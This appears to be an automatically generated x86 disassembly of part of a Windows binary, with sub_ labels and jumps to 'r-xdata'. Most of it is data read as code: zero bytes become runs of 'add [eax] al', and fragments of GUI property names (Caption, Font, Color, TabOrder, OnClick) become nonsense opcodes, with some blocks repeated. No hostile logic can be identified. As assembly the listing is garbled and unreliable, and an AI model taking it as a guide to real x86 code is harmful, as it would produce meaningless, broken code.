add [ ebx + ebx ] ah
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ eax + 0x71 ] ch
inc ebx
add [ eax - 0x77ffbae5 ] ch
pop esi
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ esi + 0x43 ] ch
add ah bl
xor [ ebp ] eax
cwde
inc ebx
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add [ eax ] al
push 0x60680043
inc ebp
add [ eax ] bh
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ edi + esi * 2 ] dl
inc ebx
add [ edi + esi * 2 + 0x43 ] cl
add [ eax + 0xe004374 ] al
push esp
dec eax
popad
jb r-xdata
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
insb
imul eax [ ebp ] 0xffffff94
xor eax [ ebp ]
lodsb [ esi ]
pop [ ecx ]
sub [ ecx ] bl
je r-xdata
and [ ebx ] al
hlt
outsb
je r-xdata
je r-xdata
outsd
outsb
je r-xdata
add cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x69570500
je r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
add al 0x8
or eax 0x64616548
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6548540e
popad
outsd
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
mov [ eax + 0x610044 ] ch
add bh bh
outsd
outsb
je r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
inc esp
inc ebx
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
inc ebp
add [ esp + esi * 2 + 0x43 ] cl
inc ebp
add [ edi + ecx * 4 + 0x19280041 ] ch
add [ eax ] cl
inc ebx
add ah dh
adc al [ ebx ]
cmp al 0x10
inc eax
add [ eax + 0x15 ] bl
inc ebx
add [ ebx + 0x431f28c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
pop ds
inc ebx
add [ eax + 0x2 ] bh
add [ eax ] al
push 0xe0004318
sbb al [ edx ]
in al dx
xor al 0x40
outsb
push cs
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
or [ edi ] al
push ebx
add [ esp + edx ] dh
inc edx
pop es
dec ecx
outsb
je r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
pop edi
add [ eax ] al
outsd
insb
nop
adc [ eax ] ah
inc ebx
add [ edi ] al
push cs
push esp
dec eax
popad
jb r-xdata
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
adc al 0x66
adc al 0x42
jb r-xdata
push [ eax ]
add dh bh
js r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
mov bh 0x44
add [ ecx + eax ] ch
push [ ecx + 0x45 ]
add [ eax ] cl
inc edx
outsd
insb
sub [ edi ] bl
inc ebx
add al dh
sbb [ ebx ] eax
xor eax [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
call [ eax + 0x100436b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
inc ebp
insb
jae r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
push esp
imul eax [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
popad
jb r-xdata
add bh bh
jpe r-xdata
[ eax + 0x440044eb ]
add [ eax - 0x5f ] cl
inc esp
add [ ebx ] bl
add bh bh
push 0x10044ed
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
jae r-xdata
add [ bx + si ] dl
inc eax
add [ ecx ] ah
add al [ eax ]
[ eax + 0x6b ]
adc [ eax ] al
push eax
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
str [ edx ]
inc esp
jb r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
adc al [ eax ]
or eax [ edx + esi * 2 + 0x61 ]
push edx
outsd
jb r-xdata
add [ eax ] al
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090026 ] al
outsd
outsb
je r-xdata
add [ edx ] bl
add [ 0x6c797453 ] al
add [ gs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
imul ebp [ esi + 0x74 ] 0x43152c73
add [ eax ] cl
add al [ eax ]
jmp [ ebx + ebp * 2 + 0x10043 ]
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ eax + 0x4518 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
push esp
inc edx
add [ eax ] ch
add bh bh
dec eax
stc
inc esp
add [ eax - 0x7 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jae r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
jo r-xdata
add [ eax ] al
and eax 0x61500e00
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
inc [ eax + 0x10044f9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
inc eax
jb r-xdata
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr [ ebx + 0xe80044 ]
add bh bh
call 0x24223a7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
jo r-xdata
outsb
jne r-xdata
add [ eax ] al
sub [ eax ] 0x0
outsb
je r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x1 ] al
daa
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
mov cl 0x44
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0028 ] al
outsb
je r-xdata
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax + 0x4f09002f ] al
outsb
dec ebp
outsd
jne r-xdata
in al dx
add [ eax ] 0x0
add [ eax + 0x4f09002c ] al
outsb
inc esp
jb r-xdata
je r-xdata
pop ss
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
push [ edi + esi * 8 + 0x44 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
js r-xdata
push cs
dec edi
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push 0x6948776f
outsb
je r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
or bl bh
inc ebx
add [ eax - 0x5 ] ch
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebp
jo r-xdata
sbb eax 0xfae00043
inc ebx
add [ eax ] dh
sti
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
outsd
ja r-xdata
test eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jo r-xdata
add al ch
sbb [ ebp ] al
add [ eax ] al
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
add bh bh
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b002d ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
dec edi
push eax
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
0x7c0045 0xff00
adc [ eax ] al
0xc8ff0000 0x44f9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
jpe r-xdata
add [ eax + 0x4f0d001c ] al
outsb
inc esp
jb r-xdata
pop ebx
inc ecx
add al bh
add [ eax ] al
inc ebx
add [ ebx + edi * 8 + 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
push cs
dec edi
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
ja r-xdata
stosb [ edi ]
inc esp
add al bl
add [ eax ] al
inc ebp
outsb
inc esp
jb r-xdata
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or [ edi + 0x6e ] ecx
outsb
stosd [ edi ]
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
popad
je r-xdata
outsb
jb r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al 0x26
inc eax
scasb [ edi ]
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
add [ eax ] al
push eax
push ds
inc ebx
add [ ebx + edi * 8 ] bl
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
arpl [ ebx + 0x38 ] bp
pop ss
inc ebx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
jb r-xdata
push edx
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
hlt
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x80 ] bp
lodsb [ esi ]
inc esp
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
outsb
inc ebx
insb
popad
jae r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
je r-xdata
lodsb [ esi ]
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax + 0x77 ] dh
inc ebx
add [ ebx ] cl
push esp
dec esi
outsd
outsb
push es
jae r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
cmp [ bp + di + 0x41 ] bl
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
jb r-xdata
outsd
jo r-xdata
daa
inc ebx
add [ eax ] dh
add [ eax ] al
jb r-xdata
inc ebx
outsd
outsb
jbe r-xdata
inc esp
popad
je r-xdata
add al dh
xor al 0x40
add ah dh
xor al 0x40
outsd
je r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x38 ] bp
lodsb [ esi ]
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
mov al 0x10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x40043 ] bl
jb r-xdata
je r-xdata
add [ eax + 0x7c ] dh
inc ebx
add ah ah
jl r-xdata
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
in al dx
imul ebp [ edi + 0x6e ] r-xdata
add [ eax + 0x5c004032 ] ah
ja r-xdata
push es
jae r-xdata
je r-xdata
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
inc esp
jb r-xdata
add [ eax ] al
dec [ esp + edi * 2 ]
inc ebx
outsd
insb
jne r-xdata
daa
add [ eax - 0x63ffbe6c ] cl
jpe r-xdata
jb r-xdata
push esp
js r-xdata
mov [ ecx + eax * 2 + 0x437a9c00 ] dl
add al 0xfe
add [ eax + 0x63 ] dh
inc ecx
add al ah
xor al 0x40
add ah ch
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsd
outsb
lodsb [ esi ]
jae r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
inc ebx
add [ eax + eax ] al
mov eax eax
or [ esi ] ah
inc ebx
add [ ebx ] al
or [ ebx + edx * 2 + 0x6f ] edx
jb r-xdata
inc ebx
add [ eax ] bl
add [ eax ] al
jmp [ eax + 0x7c ]
push ebx
add [ eax ] al
inc ebx
add ah bh
arpl [ ecx ] ax
or [ eax ] al
or [ ebx + 0x6f ] al
outsb
xor al 0x27
add [ eax ] al
inc [ eax + 0x7c ]
inc ebx
insb
jae r-xdata
insd
inc ebx
je r-xdata
add [ eax ] cl
inc ebx
outsd
add [ eax - 0x7bffbe6c ] dh
ja r-xdata
inc ebx
add [ eax - 0x73ffbe70 ] dl
js r-xdata
xor al [ eax ]
xor al [ fs : eax ]
sub al 0x78
imul ebp [ edi + 0x6e ] 0x6d726f46
inc ebx
add [ esi ] cl
push es
jae r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
hlt
outsd
outsb
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ esi + 0x43 ] dl
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
push esp
jns r-xdata
call [ eax + 0x7c ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or [ ebp + 0x61 ] cl
js r-xdata
popad
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] al
push esp
popad
shl [ 0x43 ] 0x1
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
inc eax
call esp
jpo r-xdata
add [ ecx + ebx * 2 + 0x41 ] bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ esi ] eax
push esp
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xfffffe04
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
aam 0x26
inc ebx
add [ ecx ] al
push es
push cs
inc edx
adc [ eax ] al
add bh bh
dec esp
jpo r-xdata
xchg esp eax
adc [ eax ] al
inc ebx
outsd
insb
jne r-xdata
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + edi * 2 ] ch
popad
je r-xdata
inc eax
inc ebx
add [ esi ] al
jae r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi ] al
add [ eax + 0x32 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb [ eax ] al
0x99f80041 0x41
push 0x3800437d
inc ebx
add [ eax - 0x5fffbc85 ] ch
add bh bh
pushad
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
dec [ ebx + edi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ 0xcff0000 ] cl
jl r-xdata
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
imul edi [ edx + 0x65 ] r-xdata
outsb
mov eax eax
js r-xdata
xchg esi eax
inc ecx
add [ esi + edx * 4 + 0x10041 ] dh
inc ecx
add al bh
cdq
inc ecx
add [ eax + 0x7d ] ch
inc ebx
add [ eax ] bh
inc eax
add ah ch
xor al 0x40
jpo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx * 4 - 0x6f6fffbf ] dh
inc ecx
add [ eax - 0x5fffbe70 ] bl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 ] bh
inc ecx
add [ eax - 0x66 ] al
inc ecx
add [ edx + ebx * 4 + 0x41 ] al
inc eax
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x29
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sub [ ebx ] eax
sub [ ecx ] ch
inc ebx
add [ eax + eax ] bl
add [ eax ] al
sub [ ecx + eax * 2 ] ah
loopne r-xdata
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
add [ eax ] al
add [ eax + eax ] cl
add bh bh
aam 0x7b
inc ebx
inc ebx
add [ edi ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
sub_432964
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xd8004329
sub [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0x4329
sub_433a34
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ ebx + edi * 4 + 0x1ba80043 ] dl
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ eax - 0x23ffbc69 ] bh
xor [ ebp ] eax
cwde
cdq
inc ebx
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add [ eax + 0x6800439b ] al
pushad
inc ebp
add [ eax ] bh
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ eax - 0x2e ] dl
inc ebx
add al al
test al 0x43
add al ah
mov [ 0xffffffffb9ac0043 ] eax
inc ebx
add [ eax - 0x7ffbc2e ] bl
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
add [ eax + 0x3c0043d1 ] ch
mov al 0x45
add [ edx + edx * 8 + 0x43 ] bl
add [ ebx + ebp * 4 - 0x5bd7ffbd ] al
inc ebx
add [ eax - 0xbffbc57 ] bh
test eax 0xcab00043
inc ebx
add [ eax ] cl

sub_433c94
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ ebx + edi * 4 + 0x1ba80043 ] dl
inc ebp
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ eax - 0x23ffbc69 ] bh
xor [ ebp ] eax
cwde
cdq
inc ebx
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add [ eax + 0x6800439b ] al
pushad
inc ebp
add [ eax ] bh
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add [ eax - 0x2e ] dl
inc ebx
add al al
test al 0x43
add al ah
mov [ 0xffffffffb9ac0043 ] eax
inc ebx
add [ eax - 0x7ffbc2e ] bl
rol [ ebx ] 0x1
xor al 0xd1
inc ebx
add [ eax + 0x3c0043d1 ] ch
mov al 0x45
add [ edx + edx * 8 + 0x43 ] bl
add [ ebx + ebp * 4 - 0x5bd7ffbd ] al
inc ebx
add [ eax - 0xbffbc57 ] bh
test eax 0xcab00043
inc ebx
add [ eax ] cl

sub_433d4e
inc ebx
add al ch
test al 0x43
add [ eax ] dl
test eax 0xa95c0043
inc ebx
add [ ecx + ebp * 4 - 0x3657ffbd ] al
inc ebx
add ah ch
cmpsd [ esi ] [ edi ]
inc ebx
add [ ecx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
mov eax eax
js r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
mov eax [ 0x5b0044 ]
add bh bh
push 0x10044ed
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
add eax 0x67696c41
outsb
cmp al 0x10
inc eax
inc ebx
add [ edi ] al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add [ gs : eax ] eax
test al 0xb7
inc esp
add [ edx + 0x1 ] ah
add bh bh
lodsb [ esi ]
insd
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
insb
pop es
inc ecx
insb
push esi
imul esp [ ebp + 0x77 ] r-xdata
les edi [ ebx ]
inc ebx
add [ ebx ] ch
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ eax ] al
add [ edx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
adc eax 0x6f420b00
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xfcff0001
insd
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
jbe r-xdata
mov bh 0x44
add [ ebx + 0x1 ] ah
add bh bh
push 0x100456d
outsd
arpl [ edx + 0x79 ] ax
mov [ eax + 0x610044 ] ch
add bh bh
test al 0xeb
inc esp
add ah ah
jb r-xdata
add [ eax - 0xfffffb ] al
sbb [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
jb r-xdata
add [ eax ] al
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
add [ eax ] al
adc eax [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax + 0x2 ] ch
add bh bh
movsb [ edi ] [ esi ]
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410700
add [ eax + eax ] bh
add dh bh
enter 0x44eb 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
add [ edx ] bl
add [ ebx ] cl
inc ebx
outsd
insb
jne r-xdata
sub [ ebx ] eax
cmp al 0x2
jo r-xdata
je r-xdata
sbb [ eax ] eax
pop es
inc ebx
outsd
insb
jne r-xdata
jb r-xdata
push [ eax ]
add dh bh
js r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jbe r-xdata
mov bh 0x44
add [ ecx + eax ] ah
[ eax + 0x6d ]
jb r-xdata
outsb
inc ebx
inc esp
xor [ ecx + 0x7a0044 ] ah
outsb
jae r-xdata
add bh bh
hlt
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
insb
add [ gs : edi + 0x16c0044 ] dh
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
je r-xdata
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2c65646f
dec edx
inc esi
add [ edx + eax ] dl
insb
dec edi
jne r-xdata
stc
outsd
add bh bh
inc eax
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax 0x72440a00
popad
inc ebx
jne r-xdata
adc [ eax ] al
sub al [ edx ]
add bh bh
int3
add bh bh
fdivr [ esi + 0x10043 ]
cmp [ ecx ] ch
inc ebx
add [ edx + eax ] bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
mov [ 0x10043 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ edx ] cl
inc ebx
push 0x626b6365
outsd
js r-xdata
add bh bh
add bh bh
mov eax 0x10043a3
add [ eax ] al
